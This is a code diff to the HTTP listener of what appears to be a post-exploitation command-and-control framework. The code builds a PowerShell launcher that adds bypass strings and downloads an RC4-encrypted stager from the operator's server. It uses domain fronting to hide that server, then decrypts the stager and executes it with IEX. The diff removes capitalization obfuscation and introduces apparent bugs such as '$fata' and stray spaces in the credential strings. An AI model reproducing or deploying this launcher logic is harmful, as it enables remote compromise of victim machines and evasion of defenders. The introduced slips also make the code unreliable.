@@ -403,36 +403,29 @@ class Listener(object):
 
             if language.lower().startswith("po"):
                 # PowerShell
-
-                vGPF = helpers.generate_random_script_var_name("GPF")
-                vGPC = helpers.generate_random_script_var_name("GPC")
                 vWc = helpers.generate_random_script_var_name("wc")
                 vData = helpers.generate_random_script_var_name("data")
 
                 launcherBase = '$ErrorActionPreference = "SilentlyContinue";'
 
                 if safeChecks.lower() == "true":
-                    launcherBase = helpers.randomize_capitalization(
-                        "If($PSVersionTable.PSVersion.Major -ge 3){"
-                    )
+                    launcherBase = "If($PSVersionTable.PSVersion.Major -ge 3){"
+
                 for bypass in bypasses:
                     launcherBase += bypass
+
                 if safeChecks.lower() == "true":
-                    launcherBase += "};"
-                    launcherBase += helpers.randomize_capitalization(
-                        "[System.Net.ServicePointManager]::Expect100Continue=0;"
+                    launcherBase += (
+                        "};[System.Net.ServicePointManager]::Expect100Continue=0;"
                     )
 
                 # ==== DEFINE BYTE ARRAY CONVERSION ====
-                launcherBase += helpers.randomize_capitalization(
-                    "$K=[System.Text.Encoding]::ASCII.GetBytes("
+                launcherBase += (
+                    f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ stagingKey }');"
                 )
-                launcherBase += "'%s');" % (stagingKey)
 
                 # ==== DEFINE RC4 ====
-                launcherBase += helpers.randomize_capitalization(
-                    "$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};"
-                )
+                launcherBase += "$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};"
 
                 # ==== BUILD AND STORE METADATA ====
                 routingPacket = packets.build_routing_packet(
@@ -451,9 +444,7 @@ class Listener(object):
                 )
 
                 # ==== BUILD REQUEST ====
-                launcherBase += helpers.randomize_capitalization(
-                    "$" + vWc + "=New-Object System.Net.WebClient;"
-                )
+                launcherBase += "$wc=New-Object System.Net.WebClient;"
                 launcherBase += (
                     "$ser="
                     + helpers.obfuscate_call_home_address(
@@ -475,121 +466,67 @@ class Listener(object):
                 # ==== CONFIGURE PROXY ====
                 if proxy and proxy.lower() != "none":
                     if proxy.lower() == "default":
-                        launcherBase += helpers.randomize_capitalization(
-                            "$"
-                            + vWc
-                            + ".Proxy=[System.Net.WebRequest]::DefaultWebProxy;"
+                        launcherBase += (
+                            "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"
                         )
+
                     else:
-                        launcherBase += helpers.randomize_capitalization(
-                            "$proxy=New-Object Net.WebProxy('"
+                        launcherBase += (
+                            f"$proxy=New-Object Net.WebProxy('{ proxy.lower() }');"
                         )
-                        launcherBase += proxy.lower()
-                        launcherBase += helpers.randomize_capitalization("');")
-                        launcherBase += helpers.randomize_capitalization(
-                            "$" + vWc + ".Proxy = $proxy;"
-                        )
+                        launcherBase += "$wc.Proxy = $proxy;"
+
                     if proxyCreds and proxyCreds.lower() != "none":
                         if proxyCreds.lower() == "default":
-                            launcherBase += helpers.randomize_capitalization(
-                                "$"
-                                + vWc
-                                + ".Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"
-                            )
+                            launcherBase += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"
+
                         else:
                             username = proxyCreds.split(":")[0]
                             password = proxyCreds.split(":")[1]
                             if len(username.split("\\")) > 1:
                                 usr = username.split("\\")[1]
                                 domain = username.split("\\")[0]
-                                launcherBase += (
-                                    "$netcred = New-Object System.Net.NetworkCredential('"
-                                    + usr
-                                    + "','"
-                                    + password
-                                    + "','"
-                                    + domain
-                                    + "');"
-                                )
+                                launcherBase += f"$netcred = New-Object System.Net.NetworkCredential(' {usr}', '{password}', '{domain}');"
+
                             else:
                                 usr = username.split("\\")[0]
-                                launcherBase += (
-                                    "$netcred = New-Object System.Net.NetworkCredential('"
-                                    + usr
-                                    + "','"
-                                    + password
-                                    + "');"
-                                )
-                            launcherBase += helpers.randomize_capitalization(
-                                "$" + vWc + ".Proxy.Credentials = $netcred;"
-                            )
+                                launcherBase += f"$netcred = New-Object System.Net.NetworkCredential('{ usr }', '{password}');"
+
+                            launcherBase += "$wc.Proxy.Credentials = $netcred;"
+
                     # save the proxy settings to use during the entire staging process and the agent
-                    launcherBase += "$Script:Proxy = $" + vWc + ".Proxy;"
+                    launcherBase += "$Script:Proxy = $wc.Proxy;"
 
                 # ==== ADD HEADERS ====
                 for header, value in profile.stager.client.headers.items():
                     # If host header defined, assume domain fronting is in use and add a call to the base URL first
                     # this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
                     if header.lower() == "host":
-                        launcherBase += helpers.randomize_capitalization(
-                            "try{$ig=$" + vWc + ".DownloadData($ser)}catch{};"
-                        )
-                    launcherBase += helpers.randomize_capitalization(
-                        "$" + vWc + ".Headers.Add("
-                    )
-                    launcherBase += '"%s","%s");' % (header, value)
+                        launcherBase += "try{$ig=$wc.DownloadData($ser)}catch{};"
+
+                    launcherBase += f'$wc.Headers.Add("{ header }"," { value }");'
 
                 # ==== SEND REQUEST ====
                 if (
                     profile.stager.client.verb.lower() != "get"
                     or profile.stager.client.body
                 ):
-                    launcherBase += helpers.randomize_capitalization(
-                        "$"
-                        + vData
-                        + "=$"
-                        + vWc
-                        + ".UploadData($ser+$t,'"
-                        + profile.stager.client.verb
-                        + "','"
-                        + profile.stager.client.body
-                        + "')\n"
-                    )
+                    launcherBase += f"$data=$wc.UploadData($ser+$t,'{ profile.stager.client.verb }','{ profile.stager.client.body }');"
+
                 else:
-                    launcherBase += helpers.randomize_capitalization(
-                        "$" + vData + "=$" + vWc + ".DownloadData($ser+$t);"
-                    )
+                    launcherBase += "$data=$wc.DownloadData($ser+$t);"
 
                 # ==== INTERPRET RESPONSE ====
                 if (
                     profile.stager.server.output.terminator.type
                     == malleable.Terminator.HEADER
                 ):
-                    launcherBase += helpers.randomize_capitalization(
-                        "$"
-                        + vData
-                        + "='';for ($i=0;$i -lt $"
-                        + vWc
-                        + ".ResponseHeaders.Count;$i++){"
+                    launcherBase += (
+                        "$fata='';for ($i=0;$i -lt $wc.ResponseHeaders.Count;$i++){"
                     )
-                    launcherBase += helpers.randomize_capitalization(
-                        "if ($"
-                        + vData
-                        + ".ResponseHeaders.GetKey($i) -eq '"
-                        + profile.stager.server.output.terminator.arg
-                        + "'){"
-                    )
-                    launcherBase += helpers.randomize_capitalization(
-                        "$" + vData + "=$" + vWc + ".ResponseHeaders.Get($i);"
-                    )
-                    launcherBase += helpers.randomize_capitalization(
-                        "Add-Type -AssemblyName System.Web;$"
-                        + vData
-                        + "=[System.Web.HttpUtility]::UrlDecode($"
-                        + vData
-                        + ");"
-                    )
-                    launcherBase += "}}"
+                    launcherBase += f"if ($data.ResponseHeaders.GetKey($i) -eq '{ profile.stager.server.output.terminator.arg }')"
+                    launcherBase += "{$data=$wc.ResponseHeaders.Get($i);"
+                    launcherBase += "Add-Type -AssemblyName System.Web;$data=[System.Web.HttpUtility]::UrlDecode($data);}}"
                 elif (
                     profile.stager.server.output.terminator.type
                     == malleable.Terminator.PRINT
@@ -598,26 +535,14 @@ class Listener(object):
                 else:
                     launcherBase += ""
                 launcherBase += profile.stager.server.output.generate_powershell_r(
-                    "$" + vData
+                    "$data"
                 )
 
                 # ==== EXTRACT IV AND STAGER ====
-                launcherBase += helpers.randomize_capitalization(
-                    "$iv=$"
-                    + vData
-                    + "[0..3];$"
-                    + vData
-                    + "=$"
-                    + vData
-                    + "[4..$"
-                    + vData
-                    + ".length];"
-                )
+                launcherBase += "$iv=$data[0..3];$data=$data[4..($data.length-1)];"
 
                 # ==== DECRYPT AND EXECUTE STAGER ====
-                launcherBase += helpers.randomize_capitalization(
-                    "-join[Char[]](& $R $" + vData + " ($IV+$K))|IEX"
-                )
+                launcherBase += "-join[Char[]](& $R $data ($IV+$K))|IEX"
 
                 if obfuscate:
                     launcherBase = data_util.obfuscate(
@@ -875,7 +800,7 @@ class Listener(object):
             stager = stager.replace("/index.jsp", stage1)
             stager = stager.replace("/index.php", stage2)
 
-            randomizedStager = ""
+            unobfuscated_stager = ""
             # forces inputs into a bytestring to ensure 2/3 compatibility
             stagingKey = stagingKey.encode("UTF-8")
             # stager = stager.encode('UTF-8')
@@ -885,28 +810,24 @@ class Listener(object):
                 line = line.strip()
                 # skip commented line
                 if not line.startswith("#"):
-                    # randomize capitalization of lines without quoted strings
-                    if '"' not in line:
-                        randomizedStager += helpers.randomize_capitalization(line)
-                    else:
-                        randomizedStager += line
+                    unobfuscated_stager += line
 
             if obfuscate:
-                randomizedStager = data_util.obfuscate(
+                unobfuscated_stager = data_util.obfuscate(
                     self.mainMenu.installPath,
-                    randomizedStager,
+                    unobfuscated_stager,
                     obfuscationCommand=obfuscationCommand,
                 )
 
             if encode:
-                return helpers.enc_powershell(randomizedStager)
+                return helpers.enc_powershell(unobfuscated_stager)
             elif encrypt:
                 RC4IV = os.urandom(4)
                 return RC4IV + encryption.rc4(
-                    RC4IV + stagingKey, randomizedStager.encode("UTF-8")
+                    RC4IV + stagingKey, unobfuscated_stager.encode("UTF-8")
                 )
             else:
-                return randomizedStager
+                return unobfuscated_stager
 
         elif language.lower() == "python":
             template_path = [
